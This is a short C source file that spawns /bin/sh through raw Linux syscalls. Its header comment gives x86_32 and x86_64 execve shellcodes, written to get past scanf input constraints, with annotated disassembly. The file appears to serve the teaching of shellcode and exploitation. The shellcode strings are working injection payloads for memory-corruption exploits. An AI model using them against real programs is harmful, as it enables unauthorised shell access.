/**
 * Spawn a shell using C code and Linux ABI
 *
 * Here are some shellcodes which pass scanf constraints (no \n, \0 nor space)
 *
 * x86_32 shellcode: 1\xd2Rh//shh/bin\x89\xe3RS\x89\xe11\xc0\xb0\x0b\xcd\x80
 *      31 d2                    xor    %edx,%edx   # edx = 0
 *      52                       push   %edx
 *      68 2f 2f 73 68           push   $0x68732f2f
 *      68 2f 62 69 6e           push   $0x6e69622f
 *      89 e3                    mov    %esp,%ebx   # ebx = "/bin//sh"
 *      52                       push   %edx
 *      53                       push   %ebx
 *      89 e1                    mov    %esp,%ecx   # ecx = [ebx, NULL]
 *      31 c0                    xor    %eax,%eax
 *      b0 0b                    mov    $0xb,%al    # eax = 11 = __NR_execve
 *      cd 80                    int    $0x80       # syscall(eax, ebx, ecx, edx)
 *
 * x86_64 shellcode: H\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xffH\xf7\xdbST_1\xc0\x99RWT^\xb0;\x0f\x05
 *      48 bb d1 9d 96 91 d0     movabs $0xff978cd091969dd1,%rbx
 *      8c 97 ff
 *      48 f7 db                 neg    %rbx        # rbx = 0x68732f6e69622f
 *      53                       push   %rbx
 *      54                       push   %rsp
 *      5f                       pop    %rdi        # rdi = "/bin/sh"
 *      31 c0                    xor    %eax,%eax   # eax = 0
 *      99                       cltd               # edx = 0
 *      52                       push   %rdx
 *      57                       push   %rdi
 *      54                       push   %rsp
 *      5e                       pop    %rsi        # rsi = [rdi, NULL]
 *      b0 3b                    mov    $0x3b,%al   # eax = 59 = __NR_execve
 *      0f 05                    syscall            # syscall(eax, rdi, rsi, rdx)
 *
 * More shellcodes are available on http://shell-storm.org/shellcode/
 */
#include "nolibc-syscall-linux.h"

void _start(void)
{
    char shell[] = "/bin/sh", *argv[2];
    int ret;

    argv[0] = shell;
    argv[1] = 0;
    ret = execve(shell, argv, 0);
    exit(-ret);
}
